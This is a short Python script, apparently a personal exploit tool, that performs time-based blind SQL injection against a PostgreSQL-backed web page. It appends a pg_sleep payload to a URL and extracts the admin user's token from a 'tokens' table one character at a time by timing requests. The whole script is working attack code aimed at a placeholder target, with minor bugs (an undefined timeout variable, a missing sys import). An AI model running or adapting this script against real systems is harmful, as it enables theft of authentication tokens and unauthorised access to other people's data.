import requests
from requests.exceptions import Timeout

def blind_sql_injection(i,c,http_session,url):
  # sample from postgres db query
  # this is a timeout query, if we timeout, an exception is raised and the value is passed back to the source function.
  url = url + "(SELECT%20CASE%20WHEN%20count((SELECT(SELECT%20CASE%20WHEN%20(ASCII(SUBSTRING((SELECT%20token%20FROM%20tokens%20WHERE%20username = 'admin'),"+ i + ",1))=" + c + ")%20THEN%20pg_sleep(8)%20ELSE%20$$$$%20END)))%3C%3E0%20THEN%20true%20ELSE%20false%20END);%20--"
  try:
      req = requests.get(url,timeout=timeout)
  except Timeout:
      return int(c)

def get_data_sqli(session,url):
  print('Extracting something')
  result=""
  for i in range(1,33):  # interate through each character of the target  This example is 32 characters long
      for c in range(48,123): # iterate through 0-9,A-z,a-z,  Use 32,127 for all printable characters
          print(chr(c),end = "")
          sys.stdout.flush()           
          character = blind_sql_injection(str(i),str(c),session,url)
          if not character == None:
              result = result + chr(c)
              break
          else:
              print("\b", end = "")
              sys.stdout.flush()
  print("\n")
  #print(result)
  return result

url = "http://some_vulnerable_url/"
s = requests.Session()
result = get_data_sqli(s,url)
print(result)
exit()
